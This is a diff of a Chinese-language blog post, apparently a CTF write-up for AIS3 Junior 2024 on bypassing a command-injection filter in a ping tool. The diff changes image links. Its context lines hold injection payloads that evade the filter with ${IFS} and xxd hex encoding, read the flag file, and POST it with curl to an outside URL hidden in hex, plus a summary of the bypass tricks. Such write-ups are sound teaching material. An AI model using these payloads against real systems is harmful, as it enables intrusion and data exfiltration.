@@ -196,7 +196,9 @@ Author: 堇姬Naup
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))</span><br></pre></td></tr></table></figure>
 <p>這樣就可以讀FLAG，但是會發現一件很尷尬的事，因為FLAG這份檔案用了摩斯密碼進行加密，內容的<code>-.</code>被當成參數，導致ping直接噴錯，所以我嘗試印出FLAG後再進行一次hex</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo$&#123;IFS&#125;$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))|$&#123;IFS&#125;xxd$&#123;IFS&#125;-p|tr$&#123;IFS&#125;-d$&#123;IFS&#125;&#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>
-<p>然後就解…了嗎?<br><div class="img-item" data-src="https://hackmd.io/_uploads/Sk0cfOyjC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sk0cfOyjC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>然後就解…了嗎?</p>
+<div class="img-item" data-src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/111.png" data-sub-html=".caption"><img src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/111.png" class=""></div>
+
 <p>居然被當正常的輸入ping成功了，沒有噴錯<br>所以並沒有進到</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;Name or service not known&quot;</span> <span class="keyword">in</span> result : <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, inlinePage=render_template(<span class="string">&quot;card.html&quot;</span>, message=render_template(<span class="string">&quot;post.html&quot;</span>), result=<span class="string">&quot;ERROR : \n&quot;</span> + result))</span><br></pre></td></tr></table></figure>
 
@@ -209,8 +211,12 @@ Author: 堇姬Naup
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cu$&#123;x&#125;rl$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;3638373437343730373333613266326637373635363236383666366636623265373336393734363532663633333633323636333733333331363332643333333236343331326433343635363333393264333833303333363532643339333233373332333833393339333436323330363133393061&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p)$&#123;IFS&#125;-X$&#123;IFS&#125;POST$&#123;IFS&#125;-d$&#123;IFS&#125;$(echo$&#123;IFS&#125;$(strings$&#123;IFS&#125;$(echo$&#123;IFS&#125;&#x27;464c4147&#x27;$&#123;IFS&#125;|$&#123;IFS&#125;xxd$&#123;IFS&#125;-r$&#123;IFS&#125;-p))|$&#123;IFS&#125;xxd$&#123;IFS&#125;-p|tr$&#123;IFS&#125;-d$&#123;IFS&#125;&#x27;\n&#x27;))</span><br></pre></td></tr></table></figure>
 
 <p>收到FLAG的內容</p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1vrbBeo0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1vrbBeo0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>這樣就成功了…嗎?<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJ4zZHejC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJ4zZHejC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<div class="img-item" data-src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/333.png" data-sub-html=".caption"><img src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/333.png" class=""></div>
+
+<p>這樣就成功了…嗎?</p>
+<div class="img-item" data-src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/111.png" data-sub-html=".caption"><img src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/111.png" class=""></div>
+
+
 <p>我們嘗試解密</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. .----. -- / .- / -... .- -.. / .... .- -.-. -.- . .-. --..-- / .--. .-.. . .- ... . / ... . . / .-..-. .-.-.- ..-. .-.. .- --. .-..-.</span><br></pre></td></tr></table></figure>
 
@@ -228,7 +234,9 @@ Author: 堇姬Naup
 <p>最後總結我們的bypass技巧</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -&gt; 在ping之前就curl出去</span><br><span class="line">$() -&gt; 用來執行</span><br><span class="line">$&#123;x&#125; -&gt; 繞 curl 等blacklist bypass</span><br><span class="line">$&#123;IFS&#125; -&gt; 空格bypass</span><br><span class="line">xxd -&gt; ASCII跟十六進制間轉換</span><br><span class="line">strings -&gt; the 讀 FLAG</span><br><span class="line">tr -d ‘\n’ -&gt; 把換行拔掉</span><br><span class="line">直接echoh錯誤訊息</span><br><span class="line">&#123;&#125; -&gt; 包住指令節省空白符</span><br></pre></td></tr></table></figure>
 
-<h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>最後放張圖，當助教好好玩ww(熊熊是vincent的)<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyGt4rgi0.jpg" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyGt4rgi0.jpg" alt="IMG20240818154603"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">IMG20240818154603</span></div></div></p>
+<h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>最後放張圖，當助教好好玩ww(熊熊是vincent的)</p>
+<div class="img-item" data-src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/222.jpg" data-sub-html=".caption"><img src="/2024/08/19/AIS3-Junior-2024-command-injection-bypass-master/222.jpg" class=""></div>
+
 
             </div>
 
